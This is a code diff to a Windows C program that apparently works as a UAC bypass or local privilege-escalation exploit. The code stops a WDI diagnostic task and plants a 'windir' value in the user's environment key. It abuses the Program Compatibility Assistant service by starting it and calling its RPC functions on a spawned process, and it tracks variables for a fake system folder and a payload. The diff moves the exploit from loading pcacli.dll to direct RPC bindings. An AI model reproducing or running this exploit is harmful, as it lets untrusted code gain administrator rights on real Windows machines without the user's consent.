@@ -4,8 +4,10 @@
 #include <ShlObj.h>
 #include <intrin.h>
 #include <stdio.h>
-#include "resource.h"
+#include "pcasvc.h"
 #include "pcasvc7.h"
+#include "resource.h"
+
 #define g_Instance ((HINSTANCE)&__ImageBase)
 
 extern IMAGE_DOS_HEADER __ImageBase;
@@ -41,18 +43,21 @@ EVENT_DESCRIPTOR MessageBoxEvent = {
 * terminates with abnormal exit code (other than 0). */
 #define PCA_MONITOR_PROCESS_AS_INSTALLER 2
 
-/* PcaMonitorProcess pointer prototype. Returns standard system error code
+/* PcaMonitorProcess/RAiMonitorProcess pointer prototype. Returns standard system error code.
+* RAiMonitorProcess returns error codes from PcaSvc & RPC_STATUS error codes.
 * PcaSvc needs to be running. It can be started by the INTERACTIVE users.
 * This function will start it for us if it's stopped, so no need to worry about that
 * Taken & names guessed from reverse-engineering & behavioral analysis */
-typedef DWORD(WINAPI* PcaMonitorProcessPtr)(
-	HANDLE hProcess, // handle to process to be monitored
-	int unknown0, // always set to 1
-	PWSTR exeFileName, // full path name to program executable file
-	PWSTR cmdLine, // command line, usually exeName surrounded with quotes
-	PWSTR workingDir, // working directory of program to be monitored, no trailing backslash
-	ULONG flags // set of flags to modify monitoring behavior
-);
+
+/*	typedef DWORD(WINAPI* PcaMonitorProcessPtr)(
+		HANDLE hProcess,		// handle to process to be monitored
+		int unknown0,			// always set to 1
+		PWSTR exeFileName,		// full path name to program executable file
+		PWSTR cmdLine,			// command line, usually exeName surrounded with quotes
+		PWSTR workingDir,		// working directory of program to be monitored, no trailing backslash
+		ULONG flags				// set of flags to modify monitoring behavior
+	);	*/
+
 /* Writes an event's information without registering its provider
    Definition taken from Geoff Chappell's website */
 typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
@@ -193,8 +198,8 @@ int BiTriggerMain(
 	return win32Status;
 }
 
-RPC_BINDING_HANDLE BiCreatePcaRpcBinding(
-	void
+RPC_STATUS BiCreatePcaRpcBinding(
+	RPC_BINDING_HANDLE* bindingHandle
 )
 {
 	RPC_WSTR strBinding;
@@ -240,12 +245,13 @@ RPC_BINDING_HANDLE BiCreatePcaRpcBinding(
 		goto eof;
 	}
 
-	return hBinding;
+	*bindingHandle = hBinding;
+	return rStatus;
 
 eof:
 	if (hBinding)
 		RpcBindingFree(&hBinding);
-	return NULL;
+	return rStatus;
 }
 
 int wmain(
@@ -304,8 +310,6 @@ end:
 	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE, deleteList = FALSE;
 	DWORD writtenBytes;
 	HRESULT hr;
-	HMODULE pcaModule = NULL;
-	PcaMonitorProcessPtr PcaMonitorProcess = NULL; //fixme; 4703 without initialization for some reason...
 	DWORD curDirSize;
 	PWSTR curDir = NULL;
 	LSTATUS status;
@@ -316,6 +320,11 @@ end:
 	SIZE_T attrSize;
 	HANDLE explorer = NULL;
 	WCHAR keyName[9];
+	SC_HANDLE scHandle = NULL, hService = NULL;
+	SERVICE_STATUS serviceStatus;
+	RPC_BINDING_HANDLE pcaBinding = NULL;
+	RPC_STATUS rpcStatus;
+	long pcaResult;
 
 	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 == 1) {
 		cmdLine[0] = L'L';
@@ -373,53 +382,25 @@ end:
 	if (!SUCCEEDED(BiStopWdiTask(TRUE)))
 		goto eof;
 
-	if (usesPca) {
-		pcaModule = LoadLibraryExW(L"pcacli.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
-		if (!pcaModule) {
-			wprintf(L"LoadLibraryExW() failed. Error: %lu\n", GetLastError());
-			goto eof;
-		}
-		PcaMonitorProcess = (PcaMonitorProcessPtr)GetProcAddress(pcaModule, "PcaMonitorProcess");
-		if (!PcaMonitorProcess) {
-			wprintf(L"GetProcAddress() failed. Error: %lu\n", GetLastError());
-			goto eof;
-		}
+	scHandle = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
+	if (!scHandle) {
+		wprintf(L"OpenSCManagerW() failed. Error: %lu\n", GetLastError());
+		goto eof;
 	}
-	else {
-		BOOLEAN failed = TRUE;
-		SC_HANDLE scHandle, hService = NULL;
-		SERVICE_STATUS serviceStatus;
-
-		scHandle = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
-		if (!scHandle) {
-			wprintf(L"OpenSCManagerW() failed. Error: %lu\n", GetLastError());
-			goto cleanup;
-		}
-		hService = OpenServiceW(scHandle, L"PcaSvc", SERVICE_START | SERVICE_QUERY_STATUS);
-		if (!hService) {
-			wprintf(L"OpenServiceW() failed. Error: %lu\n", GetLastError());
-			goto cleanup;
-		}
-		if (!QueryServiceStatus(hService, &serviceStatus)) {
-			wprintf(L"QueryServiceStatus() failed. Error: %lu\n", GetLastError());
-			goto cleanup;
-		}
-		if (serviceStatus.dwCurrentState != SERVICE_RUNNING)
-			if (!StartServiceW(hService, 0, NULL)) {
-				wprintf(L"StartServiceW() failed. Error: %lu\n", GetLastError());
-				goto cleanup;
-			}
-
-		failed = FALSE;
-
-cleanup:
-		if (hService)
-			CloseServiceHandle(hService);
-		if (scHandle)
-			CloseServiceHandle(scHandle);
-		if (failed)
-			goto eof;
+	hService = OpenServiceW(scHandle, L"PcaSvc", SERVICE_START | SERVICE_QUERY_STATUS);
+	if (!hService) {
+		wprintf(L"OpenServiceW() failed. Error: %lu\n", GetLastError());
+		goto eof;
 	}
+	if (!QueryServiceStatus(hService, &serviceStatus)) {
+		wprintf(L"QueryServiceStatus() failed. Error: %lu\n", GetLastError());
+		goto eof;
+	}
+	if (serviceStatus.dwCurrentState != SERVICE_RUNNING)
+		if (!StartServiceW(hService, 0, NULL)) {
+			wprintf(L"StartServiceW() failed. Error: %lu\n", GetLastError());
+			goto eof;
+		}
 
 	exeNameSize = MAX_PATH;
 	if (!QueryFullProcessImageNameW(GetCurrentProcess(), 0, exeName, &exeNameSize)) {
@@ -521,49 +502,51 @@ cleanup:
 		goto eof;
 	}
 
-	if (usesPca) {
-		status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, exeName, cmdLine,
-			curDir, PCA_MONITOR_PROCESS_NORMAL);
-		if (status) {
-			TerminateProcess(processInfo.hProcess, 0);
-			RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
-			wprintf(L"PcaMonitorProcess() failed. Error: %lu\n", (DWORD)status);
-			goto eof;
-		}
-		ResumeThread(processInfo.hThread);
-
-		WaitForSingleObject(processInfo.hProcess, INFINITE);
-		if (usesPca) {
-			GetExitCodeProcess(processInfo.hProcess, &curDirSize);
-			if (curDirSize) {
-				wprintf(L"Trigger process exited with error code: %#010x\n", curDirSize);
-				goto eofEarly;
-			}
-		}
+	rpcStatus = BiCreatePcaRpcBinding(&pcaBinding);
+	if (rpcStatus) {
+		wprintf(L"BiCreatePcaRpcBinding() failed. Error: %#010x\n", rpcStatus);
+		TerminateProcess(processInfo.hProcess, 0);
+		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
+		goto eof;
 	}
-	else {
-		RPC_BINDING_HANDLE hBinding;
-		long pcaStatus;
 
-		hBinding = BiCreatePcaRpcBinding();
-		if (!hBinding) {
+	if (usesPca) {
+		__try {
+			pcaResult = RAiMonitorProcess(pcaBinding, processInfo.hProcess, 1,
+				exeName, cmdLine, curDir, PCA_MONITOR_PROCESS_NORMAL);
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
 			TerminateProcess(processInfo.hProcess, 0);
+			wprintf(L"RAiMonitorProcess() exception: %#010x\n", GetExceptionCode());
+			goto eofEarly;
+		}
+		if (pcaResult) {
+			TerminateProcess(processInfo.hProcess, 0);
+			wprintf(L"RAiMonitorProcess() failed. Error: %ld\n", pcaResult);
 			goto eofEarly;
 		}
 
 		ResumeThread(processInfo.hThread);
+		WaitForSingleObject(processInfo.hProcess, INFINITE);
+		GetExitCodeProcess(processInfo.hProcess, &curDirSize);
+		if (curDirSize) {
+			wprintf(L"Trigger process exited with error code: %#010x\n", curDirSize);
+			goto eofEarly;
+		}
+	}
+	else {
+		ResumeThread(processInfo.hThread);
+
 		__try {
-			pcaStatus = RAiNotifyUserCallbackExceptionProcess(hBinding,
+			pcaResult = RAiNotifyUserCallbackExceptionProcess(pcaBinding,
 				exeName, 1, processInfo.dwProcessId);
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
 			wprintf(L"RAiNotifyUserCallbackExceptionProcess() exception: %#010x\n", GetExceptionCode());
-			RpcBindingFree(hBinding);
 			goto eofEarly;
 		}
-		RpcBindingFree(hBinding);
-		if (pcaStatus) {
-			wprintf(L"RAiNotifyUserCallbackExceptionProcess() failed. Error: %ld\n", pcaStatus);
+		if (pcaResult) {
+			wprintf(L"RAiNotifyUserCallbackExceptionProcess() failed. Error: %ld\n", pcaResult);
 			goto eofEarly;
 		}
 	}
@@ -602,6 +585,8 @@ eofEarly:
 	}
 
 eof:
+	if (pcaBinding)
+		RpcBindingFree(&pcaBinding);
 	if (processInfo.hThread)
 		CloseHandle(processInfo.hThread);
 	if (processInfo.hProcess)
@@ -614,8 +599,10 @@ eof:
 		CloseHandle(hSharedMem);
 	if (curDir)
 		HeapFree(GetProcessHeap(), 0, curDir);
-	if (pcaModule)
-		FreeLibrary(pcaModule);
+	if (hService)
+		CloseServiceHandle(hService);
+	if (scHandle)
+		CloseServiceHandle(scHandle);
 	if (comReady)
 		CoUninitialize();
 	if (createdPayload)
